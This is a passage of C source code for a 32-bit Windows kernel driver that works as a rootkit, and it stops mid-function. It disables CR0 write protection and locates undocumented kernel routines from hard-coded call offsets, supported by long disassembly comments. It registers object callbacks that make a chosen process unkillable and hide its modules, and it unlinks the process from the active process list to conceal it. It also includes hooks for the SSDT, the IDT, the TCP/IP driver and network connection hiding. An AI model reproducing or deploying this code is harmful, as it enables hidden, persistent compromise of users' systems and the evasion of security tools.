#include "TOKEN.h"
#include "EPROCESS.h"
#include "ETHREAD.h"
#include "LDR_DATA_TABLE_ENTRY.h"

#include "IMAGE_NT_HEADERS.h"
#include "IMAGE_DOS_HEADER.h"
#include "IMAGE_EXPORT_DIRECTORY.h"

#include "TcpIpDriverHook.h"
#include "NtFunctionsHooks.h"
#include "InternetConnectionHider.h"
#include "InterruptDescriptorTableHook.h"
#include "SystemServiceDescriptorTableHook.h"

#include <ntstrsafe.h> // RtlUnicodeStringPrintf - instead of swprintf

HANDLE callbacksRegistrationHandle = NULL;

VOID onDriverUnload(DRIVER_OBJECT* driverObject)
{
	DbgPrint("Unloading the driver\n");

	IoDeleteDevice(driverObject->DeviceObject);

	// A driver must unregister all callback routines before it unloads.
	// You can unregister the callback routine by calling the ObUnRegisterCallbacks routine.
	ObUnRegisterCallbacks(callbacksRegistrationHandle);
}

// Control Register Zero (CR0)
// It cotains bits that control how the processor behaves.
// A popular method for disabling memory-access protection in the kernel
// involved modifying a control register known as CR0.
// WP bit controls whether the processor will allow writes to read-only memory pages [0 => you can write]

void disableWriteProtection()
{
	__asm
	{
		push eax
		
		mov eax, CR0
		and eax, 0FFFEFFFFh
		mov CR0, eax

		pop eax
	}
}

void enableWriteProtection()
{
	__asm
	{
		push eax

		mov eax, CR0
		or eax, not 0FFFEFFFFh
		mov CR0, eax

		pop eax
	}
}

void sleep(LONGLONG seconds)
{
	// 1 s = 1 000 000 000 ns
	// KeDelayExecutionThread expects multiples of 100 ns
	// (so e.g. 5 => sleep for 500 ns).
	// Negative number means relative time, positive - absolute time.
	// So -seconds * 1 000 000 000 / 100 = -seconds * 10 000 000
	// ( / 100 because the unit is 100 ns )
	LARGE_INTEGER interval;
	interval.QuadPart = seconds * -10000000;

	KeDelayExecutionThread(KernelMode, FALSE, &interval);
}

/*
	If there's e.g. "call ExMapHandleToPointer" then there isn't "call <address of ExMapHandleToPointer>" but "call <relative address of ExMapHandleToPointer>"
	This function returns the relative address translated into the real one.

	E.g. if we want to find the address of ExMapHandleToPointer:
	Argument callerFunctionAddress: address of function that calls "call ExMapHandleToPointer", e.g. PsLookupProcessByProcessId
	Argument callInstructionOffset: offset of the "call ExMapHandleToPointer" instruction relative to PsLookupProcessByProcessId
*/
BYTE* getFunctionFromCallInstruction(BYTE* callerFunctionAddress, ULONG callInstructionOffset)
{
	LONG relativeAddress = *(LONG*)(callerFunctionAddress + callInstructionOffset + 1);

	return callerFunctionAddress + callInstructionOffset + 5 + relativeAddress;
}

/*
PAGE:006685B9                         ; ---------------------------------------------------------------------------
PAGE:006685BE 90 90 90 90 90                          db 5 dup(90h)
PAGE:006685C3                         ; Exported entry 1318. PsLookupProcessByProcessId
PAGE:006685C3
PAGE:006685C3                         ; =============== S U B R O U T I N E =======================================
PAGE:006685C3
PAGE:006685C3                         ; Attributes: bp-based frame
PAGE:006685C3
PAGE:006685C3                                         public PsLookupProcessByProcessId
PAGE:006685C3                         PsLookupProcessByProcessId proc near    ; CODE XREF: sub_4C15A8+2Cp
PAGE:006685C3                                                                 ; sub_61A909+4Ep ...
PAGE:006685C3
PAGE:006685C3                         var_C           = dword ptr -0Ch
PAGE:006685C3                         var_8           = dword ptr -8
PAGE:006685C3                         var_4           = dword ptr -4
PAGE:006685C3                         arg_0           = dword ptr  8
PAGE:006685C3                         arg_4           = dword ptr  0Ch
PAGE:006685C3
PAGE:006685C3 8B FF                                   mov     edi, edi
PAGE:006685C5 55                                      push    ebp
PAGE:006685C6 8B EC                                   mov     ebp, esp
PAGE:006685C8 83 EC 0C                                sub     esp, 0Ch
PAGE:006685CB 53                                      push    ebx
PAGE:006685CC 56                                      push    esi
PAGE:006685CD 64 8B 35 24 01 00 00                    mov     esi, large fs:124h
PAGE:006685D4 33 DB                                   xor     ebx, ebx
PAGE:006685D6 66 FF 8E 84 00 00 00                    dec     word ptr [esi+84h]
PAGE:006685DD 57                                      push    edi
PAGE:006685DE FF 75 08                                push    [ebp+arg_0]
PAGE:006685E1 8B 3D 94 CD 54 00                       mov     edi, PspCidTable
PAGE:006685E7 E8 EF 52 FE FF						  call    ExMapHandleToPointer ; ExMapHandleToPointer = 0064D8DB

/////////////////////////////////////////////////////////////////////////////////////

	The actual target of the call can be calculated as follows:

	E8 is a call with a relative offset.
	In a 32-bit code segment, the offset is specified as a signed 32-bit value.
	This value is in little-endian byte order.
	The offset is measured from the address of the following instruction.

	e.g.

	<some address>       E8 32 F6 FF FF         call <somewhere>
	<some address>+5     (next instruction)

	The offset is 0xFFFFF632.
	Interpreted as a signed 32-bit value, this is -0x9CE.
	The call instruction is at <some address> and is 5 bytes long; the next instruction is at <some address> + 5.
	So the target address of the call is <some address> + 5 - 0x9CE.
*/
// instead of ExMapHandleToPointer we can also do what this function does internally,
// which is iterating through HANDLE_TABLE, find the given HANDLE and return the object assigned to it
PHANDLE_TABLE_ENTRY ExMapHandleToPointer(PHANDLE_TABLE HandleTable, HANDLE ProcessId)
{
	static BOOLEAN once = FALSE;

	typedef PHANDLE_TABLE_ENTRY (NTAPI* ExMapHandleToPointerType)(PHANDLE_TABLE Handletable, HANDLE ProcessId);
	
	static ExMapHandleToPointerType exMapHandleToPointer;

	if(!once)
	{
		// PsLookupProcessByProcessId + 0x24 = address of "call ExMapHandleToPointer" in PsLookupProcessByProcessId
		exMapHandleToPointer = (ExMapHandleToPointerType)getFunctionFromCallInstruction(PsLookupProcessByProcessId, 0x24);

		once = TRUE;
	}

	// odd calling convention - first parameter goes into edi (the other one onto stack)
	__asm
	{
		push edi; save edi

		push ProcessId
		mov edi, HandleTable
		call exMapHandleToPointer

		pop edi
	}
}

/*
In PsLookupProcessByProcessId:
PAGE:00668609                loc_668609:                             ; CODE XREF: PsLookupProcessByProcessId+42j
PAGE:00668609 A1 94 CD 54 00                 mov     eax, PspCidTable
PAGE:0066860E 33 C9                          xor     ecx, ecx
PAGE:00668610 41                             inc     ecx
PAGE:00668611 F0 09 0F                       lock or [edi], ecx
PAGE:00668614 8D 48 18                       lea     ecx, [eax+18h]
PAGE:00668617 87 45 FC                       xchg    eax, [ebp+var_4]
PAGE:0066861A 83 39 00                       cmp     dword ptr [ecx], 0
PAGE:0066861D 74 07                          jz      short loc_668626
PAGE:0066861F 33 D2                          xor     edx, edx
PAGE:00668621 E8 BB 5E E3 FF                 call    ExfUnblockPushLock

*/
// ExfUnblockPushLock uses __fastcall calling convention
// I think it should be used when I'm no longer using the object returned by ExMapHandleToPointer
// and if it's not called then after the next ExMapHandleToPointer call it'll await ExfUnblockPushLock call
// so I won't be able to use the object returned by ExMapHandleToPointer
// and since it'll be waiting indefinitely no more code will be able to run
//
// it should be used like so:
// if(ht->HandleContentionEvent)ExfUnblockPushLock(ht->HandleContentionEvent, NULL);
// where ht is HANDLE_TABLE given to ExMapHandleToPointer
// (Event is most likely of type KEVENT*)
void __fastcall ExfUnblockPushLock(EX_PUSH_LOCK* PushLock, KEVENT* Event)
{
	static BOOLEAN once = FALSE;

	typedef void (__fastcall* ExfUnblockPushLockType)(EX_PUSH_LOCK* PushLock, KEVENT* Event);

	static ExfUnblockPushLockType exfUnblockPushLock;

	if(!once)
	{
		// PsLookupProcessByProcessId + 0x5E = address of "call ExfUnblockPushLock" in PsLookupProcessByProcessId
		exfUnblockPushLock = getFunctionFromCallInstruction(PsLookupProcessByProcessId, 0x5E);

		once = TRUE;
	}

	exfUnblockPushLock(PushLock, Event);
}

HANDLE clientPID = NULL;
EPROCESS* clientProcess = NULL;

// registrationContext:
// The context that the driver specifies as the CallBackRegistration->RegistrationContext
// parameter of the ObRegisterCallbacks routine.
// info:
// A pointer to an OB_PRE_OPERATION_INFORMATION structure that specifies the parameters
// of the handle operation.
// Drivers must return OB_PREOP_SUCCESS.
// You can never add access rights beyond what is specified in the DesiredAccess member.
// If the access right is listed as a modifiable flag, the access right can be removed.
// so not all flags can be removed
//
// those callbacks makes it so taht the process is still visible but its modules can't be seen
// and more accurate information about its threads can't be read (but the base address, cycles delta etc. is visible)
// but it also makes it "immortal" (closing its window by pressing "X" doesn't work; calling TerminateProcess returns access denied error)
OB_PREOP_CALLBACK_STATUS preop(PVOID registrationContext, POB_PRE_OPERATION_INFORMATION info)
{
	if((info->ObjectType == *PsProcessType && info->Object == clientProcess) ||
		(info->ObjectType == *PsThreadType && ((ETHREAD*)info->Object)->Process == clientProcess))
	{
		DbgPrint("Preoperation callback for %s:\n", info->ObjectType == *PsProcessType ? "process" : "thread");
		
		if(info->Operation == OB_OPERATION_HANDLE_CREATE)
			DbgPrint("\t> Operation is OB_OPERATION_HANDLE_CREATE, DesiredAccess = %X\n", info->Parameters->CreateHandleInformation.DesiredAccess);
		else if(info->Operation == OB_OPERATION_HANDLE_DUPLICATE)
			DbgPrint("\t> Operation is OB_OPERATION_HANDLE_DUPLICATE, DesiredAccess = %X\n", info->Parameters->DuplicateHandleInformation.DesiredAccess);

		if(info->Operation == OB_OPERATION_HANDLE_CREATE)
			info->Parameters->CreateHandleInformation.DesiredAccess = 0;
		else if(info->Operation == OB_OPERATION_HANDLE_DUPLICATE)
			info->Parameters->DuplicateHandleInformation.DesiredAccess = 0;
	}

	return OB_PREOP_SUCCESS;
}

/*
	The following table lists the system-defined load order groups and altitude ranges for minifilter drivers. For each load order group, the Load order group column contains the value that should be specified for that group in the LoadOrderGroup entry in the ServiceInstall Section of a minifilter's INF file. The Altitude range column contains the range of altitudes for a particular load order group. A minifilter driver must request an altitude allocation from Microsoft in the appropriate load order group or groups.

	Note that the load order groups and altitude ranges are listed as they appear on the stack, which is the reverse of the order in which they are loaded.
	Load order group - Altitude range -	Description

	Filter - 420000-429999 - This group is the same as the Filter load order group that was available on Windows 2000 and earlier.
	This group loads last and thus attaches furthest from the file system.

	FSFilter Top - 400000-409999 - This group is provided for filter drivers that must attach above all other FSFilter types.
	FSFilter Activity Monitor - 360000-389999 - This group includes filter drivers that observe and report on file I/O.
	FSFilter Undelete - 340000-349999 - This group includes filters that recover deleted files.
	FSFilter Anti-Virus - 320000-329999 - This group includes filter drivers that detect and disinfect viruses during file I/O.
	FSFilter Replication - 300000-309999 - This group includes filter drivers that replicate file data to remote servers.
	FSFilter Continuous Backup - 280000-289999 - This group includes filter drivers that replicate file data to backup media.
	FSFilter Content Screener - 260000-269999 - This group includes filter drivers that prevent the creation of specific files or file content.
	FSFilter Quota Management - 240000-249999 - This group includes filter drivers that provide enhanced file system quotas.
	FSFilter System Recovery - 220000-229999 - This group includes filter drivers that perform operations to maintain operating system integrity, such as the System Restore (SR) filter.
	FSFilter Cluster File System - 200000-209999 - This group includes filter drivers that are used in products that provide file server metadata across a network.
	FSFilter HSM - 180000-189999 - This group includes filter drivers that perform hierarchical storage management.
	FSFilter Imaging - 170000-175000 - This group includes ZIP-like filter drivers that provide a virtual namespace.
	This load group is available on Windows Vista and later versions of the operating system.

	FSFilter Compression - 160000-169999 - This group includes filter drivers that perform file data compression.
	FSFilter Encryption - 140000-149999 - This group includes filter drivers that encrypt and decrypt data during file I/O.
	FSFilter Virtualization - 130000- 139999 - This group includes filter drivers that virtualize the file path, such as the Least Authorized User (LUA) filter driver added in Windows Vista.
	This load group is available on Windows Vista and later versions of the operating system.

	FSFilter Physical Quota Management - 120000-129999 - This group includes filter drivers that manage quotas by using physical block counts.
	FSFilter Open File - 100000-109999 - This group includes filter drivers that provide snapshots of already open files.
	FSFilter Security Enhancer - 80000-89999 - This group includes filter drivers that apply lockdown and enhanced access control lists (ACLs).
	FSFilter Copy Protection - 60000-69999 - This group includes filter drivers that check for out-of-band data on media.
	FSFilter Bottom - 40000-49999 - This group is provided for filter drivers that must attach below all other FSFilter types.
	FSFilter System - 20000-29999 - Reserved for internal use.

	FSFilter Infrastructure - Reserved for internal use. This group loads first and thus attaches closest to the file system.

	We'll use FSFilter Quota Management. It doesn't have many oficially registered drivers

	Minifilter 	     Altitude 	Company
	ntps_qfs.sys 	  245100 	NTP Software
	PSSFsFilter.sys  245000 	PSS Systems
	Sptqmg.sys 	     245300 	Safend
	storqosflt.sys   244000 	Microsoft

	we can used any number in range 240000-249999 besides 244000, 245000, 245100 and245300. 

	It can be e.g. 241794.
*/
void registerCallbacks()
{
	OB_OPERATION_REGISTRATION obs[] =
	{
		{
			.ObjectType = PsProcessType,
			.Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
			.PreOperation = preop,
			.PostOperation = NULL
		},
		{
			.ObjectType = PsThreadType,
			.Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
			.PreOperation = preop,
			.PostOperation = NULL
		}
	};

	OB_CALLBACK_REGISTRATION cr;
	cr.RegistrationContext = NULL;
	cr.OperationRegistration = obs;
	cr.OperationRegistrationCount = 2;
	cr.Version = OB_FLT_REGISTRATION_VERSION;

	// 20000-29999 - Reserved for internal use
	int altitudesTable[][2] =
	{
		{40000, 49999},
		{60000, 69999},
		{80000, 89999},
		{100000, 109999},
		{120000, 129999},
		{130000, 139999},
		{140000, 149999},
		{160000, 169999},
		{170000, 175000},
		{180000, 189999},
		{200000, 209999},
		{220000, 229999},
		{240000, 249999},
		{260000, 269999},
		{280000, 289999},
		{300000, 309999},
		{320000, 329999},
		{340000, 349999},
		{360000, 389999},
		{400000, 409999},
		{420000, 429999},
	};
	
	int currentAltitude = 241794;

	/*
		RtlUnicodeStringPrintf returns the STATUS_INVALID_PARAMETER value when one of the following occurs:

	   - The contents of the UNICODE_STRING structure that the DestinationString parameter points to are invalid.
	   - The destination buffer is already full.
	   - A NULL pointer is present.
	   - The destination buffer's length is zero, but a nonzero length source string is present.
	*/

	WCHAR altitudeBuffer[8];
	cr.Altitude.Buffer = altitudeBuffer;
	cr.Altitude.MaximumLength = cr.Altitude.Length = 8 * sizeof(*altitudeBuffer);

	RtlZeroMemory(cr.Altitude.Buffer, cr.Altitude.Length); 

	NTSTATUS status = RtlUnicodeStringPrintf(&cr.Altitude, L"%d", currentAltitude);

	if(!NT_SUCCESS(status))
		DbgPrint("RtlUnicodeStringPrintf failed with code %X\n", s);

	DbgPrint("Altitude => \"%wZ\"\n", &cr.Altitude);

	status = ObRegisterCallbacks(&cr, &callbacksRegistrationHandle);

	if(NT_SUCCESS(status))
		DbgPrint("ObRegisterCallbacks succeeded\n");
	else
		DbgPrint("ObRegisterCallbacks failed with code %X\n", status);

	if(status != STATUS_FLT_INSTANCE_ALTITUDE_COLLISION)
		return;
	
	// if the first altitude didn't work then try each one until it succeeds
	for(int i = 0; i < sizeof(altitudesTable) / sizeof(*altitudesTable); i++)
		for(int j = altitudesTable[i][0]; j <= altitudesTable[i][1]; j++)
		{
			// j = lowest altitude in given range
			// j <= highest altitutde in given range

			RtlZeroMemory(cr.Altitude.Buffer, cr.Altitude.Length);
			
			status = RtlUnicodeStringPrintf(&cr.Altitude, L"%d", j);

			if(!NT_SUCCESS(status))
				DbgPrint("RtlUnicodeStringPrintf failed with code %X\n", s);
			
			// try the new altitude, return if succeeded
			status = ObRegisterCallbacks(&cr, &callbacksRegistrationHandle);

			if(NT_SUCCESS(status))
			{
				DbgPrint("ObRegisterCallbacks succeeded with different altitude\n");

				return;
			}

			if(status != STATUS_FLT_INSTANCE_ALTITUDE_COLLISION)
			{
				DbgPrint("ObRegisterCallbacks failed with code %X\n", status);
				
				return;
			}
		}
}

BYTE* getPspCreateProcessNotifyRoutine()
{
	static BOOLEAN once = FALSE;

	static BYTE* PspCreateProcessNotifyRoutine = NULL;

	if(!once)
	{
		//PsSetCreateProcessNotifyRoutine + 0xD = address of "call nt!PspSetCreateProcessNotifyRoutine (82bd9a06)" in PsSetCreateProcessNotifyRoutine
		PspCreateProcessNotifyRoutine = getFunctionFromCallInstruction(PsSetCreateProcessNotifyRoutine, 0xD);

		once = TRUE;
	}

	return PspCreateProcessNotifyRoutine;
}

ULONG* getPspNotifyEnableMask()
{
	return *(ULONG**)(getPspCreateProcessNotifyRoutine() + 0x18C);
}

LDR_DATA_TABLE_ENTRY* getPsLoadedModuleList()
{
	return **(LDR_DATA_TABLE_ENTRY***)((BYTE*)MmAddVerifierThunks + 0xB4);
}

// flag obtained from MmVerifyCallbackFunction, as it returns TRUE only if this flag is set
// it can be set within LDR_DATA_TABLE_ENTRY.Flags
#define FLAG_IS_VERIFIED_IMAGE 0x20

void dispatchUserModeAPCRoutine();

/*
Getting ExpQuerySystemInformation:

	nt!NtQuerySystemInformation:
	82c784ac 8bff            mov     edi,edi
	82c784ae 55              push    ebp
	82c784af 8bec            mov     ebp,esp
	82c784b1 8b5508          mov     edx,dword ptr [ebp+8]
	82c784b4 83fa53          cmp     edx,53h
	82c784b7 7f21            jg      nt!NtQuerySystemInformation+0x2e (82c784da)

	nt!NtQuerySystemInformation+0xd:
	82c784b9 7440            je      nt!NtQuerySystemInformation+0x4f (82c784fb)

	nt!NtQuerySystemInformation+0xf:
	82c784bb 83fa08          cmp     edx,8
	82c784be 743b            je      nt!NtQuerySystemInformation+0x4f (82c784fb)

	nt!NtQuerySystemInformation+0x14:
	82c784c0 83fa17          cmp     edx,17h
	82c784c3 7436            je      nt!NtQuerySystemInformation+0x4f (82c784fb)

	nt!NtQuerySystemInformation+0x19:
	82c784c5 83fa2a          cmp     edx,2Ah
	82c784c8 7431            je      nt!NtQuerySystemInformation+0x4f (82c784fb)

	nt!NtQuerySystemInformation+0x1e:
	82c784ca 83fa3d          cmp     edx,3Dh
	82c784cd 742c            je      nt!NtQuerySystemInformation+0x4f (82c784fb)

	nt!NtQuerySystemInformation+0x23:
	82c784cf 83fa49          cmp     edx,49h
	82c784d2 751a            jne     nt!NtQuerySystemInformation+0x42 (82c784ee)

	nt!NtQuerySystemInformation+0x28:
	82c784d4 83650800        and     dword ptr [ebp+8],0
	82c784d8 eb31            jmp     nt!NtQuerySystemInformation+0x5f (82c7850b)

	nt!NtQuerySystemInformation+0x2e:
	82c784da 8bc2            mov     eax,edx
	82c784dc 83e864          sub     eax,64h
	82c784df 741a            je      nt!NtQuerySystemInformation+0x4f (82c784fb)

	nt!NtQuerySystemInformation+0x35:
	82c784e1 83e807          sub     eax,7
	82c784e4 740e            je      nt!NtQuerySystemInformation+0x48 (82c784f4)

	nt!NtQuerySystemInformation+0x3a:
	82c784e6 48              dec     eax
	82c784e7 7412            je      nt!NtQuerySystemInformation+0x4f (82c784fb)

	nt!NtQuerySystemInformation+0x3d:
	82c784e9 83e80d          sub     eax,0Dh
	82c784ec 7406            je      nt!NtQuerySystemInformation+0x48 (82c784f4)

	nt!NtQuerySystemInformation+0x42:
	82c784ee 33c0            xor     eax,eax
	82c784f0 33c9            xor     ecx,ecx
	82c784f2 eb1d            jmp     nt!NtQuerySystemInformation+0x65 (82c78511)

	nt!NtQuerySystemInformation+0x48:
	82c784f4 b8030000c0      mov     eax,0C0000003h
	82c784f9 eb27            jmp     nt!NtQuerySystemInformation+0x76 (82c78522)

	nt!NtQuerySystemInformation+0x4f:
	82c784fb 64a120000000    mov     eax,dword ptr fs:[00000020h]
	82c78501 0fb780c6030000  movzx   eax,word ptr [eax+3C6h]
	82c78508 894508          mov     dword ptr [ebp+8],eax

	nt!NtQuerySystemInformation+0x5f:
	82c7850b 6a02            push    2
	82c7850d 59              pop     ecx
	82c7850e 8d4508          lea     eax,[ebp+8]

	nt!NtQuerySystemInformation+0x65:
	82c78511 ff7510          push    dword ptr [ebp+10h]
	82c78514 ff750c          push    dword ptr [ebp+0Ch]
	82c78517 51              push    ecx
	82c78518 50              push    eax
	82c78519 52              push    edx
	82c7851a 8b5514          mov     edx,dword ptr [ebp+14h]
	82c7851d e80fe1feff      call    nt!ExpQuerySystemInformation (82c66631) ; <----

	nt!NtQuerySystemInformation+0x76:
	82c78522 5d              pop     ebp
	82c78523 c21000          ret     10h
*/
/*
Getting ExpQueryModuleInformation:
	
	============================================================================================================
				ChildEBP RetAddr  
				8a057890 82c677d4 nt!ExpQueryModuleInformation
				8a0578e0 82c6e643 nt!ExpQuerySystemInformation+0x11a3
				8a0578f0 82c6eef4 nt!ObReleaseObjectSecurity+0x26
				8a05791c 82c6dfba nt!ObCheckObjectAccess+0xe9
				8a057940 82c6af32 nt!ObpGrantAccess+0x5f
				8a0579a0 82c890a8 nt!ObpCreateHandle+0x8b
				8a057b20 82c941fa nt!ObOpenObjectByPointerWithTag+0xc1
				8a057b48 82c6baf1 nt!ObOpenObjectByPointer+0x24
				8a057b60 82aac0a2 nt!SeDeleteAccessState+0x7a
				8a057b64 82cbf4d1 nt!_SEH_epilog4_GS+0xa
				8a057b68 fc7622de nt!PsOpenProcess+0x295
				WARNING: Frame IP not in any known module. Following frames may be wrong.
				8a057b6c 01f1f54c 0xfc7622de
				8a057b70 01f1f508 0x1f1f54c
				8a057b74 82c59cd1 0x1f1f508
				8a057b78 000abc77 nt!NtOpenProcess
				8a057b7c 00000000 0xabc77

	============================================================================================================

	kd> uf nt!ExpQuerySystemInformation+0x1193
		nt!ExpQuerySystemInformation+0x9a4:
		82c66fd5 8b7dc4          mov     edi,dword ptr [ebp-3Ch]
		82c66fd8 8b45cc          mov     eax,dword ptr [ebp-34h]
		82c66fdb 85c0            test    eax,eax
		82c66fdd 0f84cf130000    je      nt!ExpQuerySystemInformation+0x1d7a (82c683b2)

		nt!ExpQuerySystemInformation+0x9b2:
		82c66fe3 c745fc5c000000  mov     dword ptr [ebp-4],5Ch
		82c66fea 8b4dd0          mov     ecx,dword ptr [ebp-30h]
		82c66fed 8908            mov     dword ptr [eax],ecx
		82c66fef e94c210000      jmp     nt!ExpQuerySystemInformation+0x2b02 (82c69140)

		nt!ExpQuerySystemInformation+0x1193:
		82c677c4 e8a049e5ff      call    nt!ExAcquireResourceExclusiveLite (82abc169)
		82c677c9 8d45d0          lea     eax,[ebp-30h]
		82c677cc 50              push    eax
		82c677cd 56              push    esi
		82c677ce 53              push    ebx
		82c677cf e81d38ffff      call    nt!ExpQueryModuleInformation (82c5aff1); <==========
		82c677d4 8945c4          mov     dword ptr [ebp-3Ch],eax
		82c677d7 8bcf            mov     ecx,edi
		82c677d9 e8c1efe3ff      call    nt!ExReleaseResourceLite (82aa679f)
		82c677de 648b0d24010000  mov     ecx,dword ptr fs:[124h]
		82c677e5 8d8184000000    lea     eax,[ecx+84h]
		82c677eb 66ff00          inc     word ptr [eax]
		82c677ee 0fb700          movzx   eax,word ptr [eax]
		82c677f1 6685c0          test    ax,ax
		82c677f4 0f85dbf7ffff    jne     nt!ExpQuerySystemInformation+0x9a4 (82c66fd5)

		nt!ExpQuerySystemInformation+0x11c9:
		82c677fa 8d4140          lea     eax,[ecx+40h]
		82c677fd 3900            cmp     dword ptr [eax],eax
		82c677ff 0f84d0f7ffff    je      nt!ExpQuerySystemInformation+0x9a4 (82c66fd5)

		nt!ExpQuerySystemInformation+0x11d4:
		82c67805 6683b98600000000 cmp     word ptr [ecx+86h],0
		82c6780d 0f85c2f7ffff    jne     nt!ExpQuerySystemInformation+0x9a4 (82c66fd5)

		nt!ExpQuerySystemInformation+0x11e2:
		82c67813 e826d2dfff      call    nt!KiCheckForKernelApcDelivery (82a64a3e)
		82c67818 e9b8f7ffff      jmp     nt!ExpQuerySystemInformation+0x9a4 (82c66fd5)

		nt!ExpQuerySystemInformation+0x1d7a:
		82c683b2 8bc7            mov     eax,edi
		82c683b4 e9b40d0000      jmp     nt!ExpQuerySystemInformation+0x2b2f (82c6916d)

		nt!ExpQuerySystemInformation+0x2b02:
		82c69140 c745fcfeffffff  mov     dword ptr [ebp-4],0FFFFFFFEh
		82c69147 e966f2ffff      jmp     nt!ExpQuerySystemInformation+0x1d7a (82c683b2)

		nt!ExpQuerySystemInformation+0x2b2f:
		82c6916d e8262fe4ff      call    nt!_SEH_epilog4_GS (82aac098)
		82c69172 c21400          ret     14h

*/
/*
	Getting ExpGetProcessInformation:
		kd> u nt!ExpQuerySystemInformation+0xe73
			nt!ExpQuerySystemInformation+0xe73:
				82c674a4 6a00            push    0
				82c674a6 8d45d0          lea     eax,[ebp-30h]
				82c674a9 50              push    eax
				82c674aa 56              push    esi
				82c674ab 53              push    ebx
				82c674ac e8dc460100      call    nt!ExpGetProcessInformation (82c7bb8d); <=====
				82c674b1 8bf8            mov     edi,eax
				82c674b3 e920fbffff      jmp     nt!ExpQuerySystemInformation+0x9a7 (82c66fd8)

	And PsGetNextProcess:
		nt!ExpGetProcessInformation+0x5ee:
			82c7c182 2345d8          and     eax,dword ptr [ebp-28h]
			82c7c185 50              push    eax
			82c7c186 e832f9ffff      call    nt!PsGetNextProcess (82c7babd); <=====
			82c7c18b 8945d8          mov     dword ptr [ebp-28h],eax
			82c7c18e 8bf8            mov     edi,eax
			82c7c190 e964faffff      jmp     nt!ExpGetProcessInformation+0x6c (82c7bbf9)
			82c7c195 394de0          cmp     dword ptr [ebp-20h],ecx
			82c7c198 7c3a            jl      nt!ExpGetProcessInformation+0x640 (82c7c1d4)

	And finally PsActiveProcessHead:
		nt!PsGetNextProcess+0x3b:
			82c7baf8 8b4508          mov     eax,dword ptr [ebp+8]
			82c7bafb 8b1d707db882    mov     ebx,dword ptr [nt!PsActiveProcessHead (82b87d70)]; <====
			82c7bb01 85c0            test    eax,eax
			82c7bb03 741c            je      nt!PsGetNextProcess+0x64 (82c7bb21)
*/
BYTE* getExpQuerySystemInformation()
{
	static BOOLEAN once = FALSE;

	static BYTE* ExpQuerySystemInformation = NULL;

	if(!once)
	{
		//NtQuerySystemInformation + 0x71 = address of "call nt!ExpQuerySystemInformation" in NtQuerySystemInformation
		ExpQuerySystemInformation = getFunctionFromCallInstruction(NtQuerySystemInformation, 0x71);

		once = TRUE;
	}

	return ExpQuerySystemInformation;
}

BYTE* getExpQueryModuleInformation()
{
	static BOOLEAN once = FALSE;

	static BYTE* ExpQueryModuleInformation = NULL;

	if(!once)
	{
		//getExpQuerySystemInformation() + 0x119E = address of "call nt!ExpQueryModuleInformation" in ExpQuerySystemInformation
		ExpQueryModuleInformation = getFunctionFromCallInstruction(getExpQuerySystemInformation(), 0x119E);

		once = TRUE;
	}

	return ExpQueryModuleInformation;
}

BYTE* getExpGetProcessInformation()
{
	static BOOLEAN once = FALSE;

	static BYTE* ExpGetProcessInformation = NULL;

	if(!once)
	{
		//getExpQuerySystemInformation() + 0xE7B = address of "call nt!ExpGetProcessInformation" in ExpQuerySystemInformation
		ExpGetProcessInformation = getFunctionFromCallInstruction(getExpQuerySystemInformation(), 0xE7B);

		once = TRUE;
	}

	return ExpGetProcessInformation;
}

BYTE* getPsGetNextProcess()
{
	static BOOLEAN once = FALSE;

	static BYTE* PsGetProcess = NULL;

	if(!once)
	{
		//getExpGetProcessInformation() + 0x5F9 = address of "call nt!PsGetNextProcess" in ExpGetProcessInformation
		PsGetProcess = getFunctionFromCallInstruction(getExpGetProcessInformation(), 0x5F9);

		once = TRUE;
	}

	return PsGetProcess;
}

LIST_ENTRY* getPsActiveProcessHead()
{
	/*
		nt!PsGetNextProcess+0x3b:
		82c7baf8 8b4508          mov     eax,dword ptr [ebp+8]
		82c7bafb 8b1d707db882    mov     ebx,dword ptr [nt!PsActiveProcessHead (82b87d70)]
		82c7bb01 85c0            test    eax,eax
		82c7bb03 741c            je      nt!PsGetNextProcess+0x64 (82c7bb21)
	*/

	return *(LIST_ENTRY**)(getPsGetNextProcess() + 0x40);
}

// returns Head
LDR_DATA_TABLE_ENTRY* getMmLoadedUserImageList()
{
	/*
		nt!ExpQueryModuleInformation+0x121:
		82c5b112 bae8fcb882      mov     edx,offset nt!MmLoadedUserImageList (82b8fce8)
		82c5b117 85d2            test    edx,edx
		82c5b119 0f84fa000000    je      nt!ExpQueryModuleInformation+0x228 (82c5b219)
	*/

	return *(LDR_DATA_TABLE_ENTRY**)(getExpQueryModuleInformation() + 0x122);
}

TOKEN* getProcessToken(EPROCESS* process)
{
	// RefCnt takes the first 3 bits, so don't count them and zero them out
	return process->Token.Value & 0xFFFFFFF8;
}

PFILE_OBJECT getHandleObjectBelongingToProcess(EPROCESS* process, HANDLE handle)
{	
	// 1 << 31 == 0x80000000
	// clear the last bit
	handle = (DWORD)handle & ~(1 << 31);

	PHANDLE_TABLE_ENTRY hte = ExMapHandleToPointer(process->ObjectTable, handle);
	
	if(!hte)
	{
		DbgPrint("Handle %X in process %X not found\n", handle, process);
		
		return NULL;
	}

	// Object & 0xFFFFFFF8: see HANDLE_TABLE.h -> HANDLE_TABLE_ENTRY
	OBJECT_HEADER* objectHeader = (ULONG)hte->Object & 0xFFFFFFF8;

	EX_PUSH_LOCK pushLock = process->ObjectTable->HandleContentionEvent;

	if(pushLock)
		ExfUnblockPushLock(pushLock, NULL);

	DbgPrint("Found handle %X in process' %X object table\n", handle, process);

	return &objectHeader->Body;
}

void hideListEntry(LIST_ENTRY* entry)
{
	LIST_ENTRY* blink = entry->Blink;
	(blink->Flink = entry->Flink)->Blink = blink;
}

#define SET_BIT(FLAG, BIT) (FLAG) |= 1 << (BIT)

// hides the process from various lists so that it can't be seen from e.g. NtQuerySystemInformation
// (could also e.g. hide threads/clear their fields like entry point)
void setupClientProcess()
{
	LIST_ENTRY* head = getPsActiveProcessHead();
	LIST_ENTRY* entry = head;

	while(entry->Flink != head)
	{
		entry = entry->Flink;

		EPROCESS* process = CONTAINING_RECORD(entry, EPROCESS, ActiveProcessLinks);

		if(process->UniqueProcessId == clientPID)
		{
			clientProcess = process;
			
			DbgPrint("Found client process in ActiveProcessLinks (list entry = %X, process = %X)\n", entry, process);

			DbgPrint("Name buffer = \"%wZ\", length = %d\n", &process->SeAuditProcessCreationInfo.ImageFileName->Name, process->SeAuditProcessCreationInfo.ImageFileName->Name.Length);

			// erase client process' name
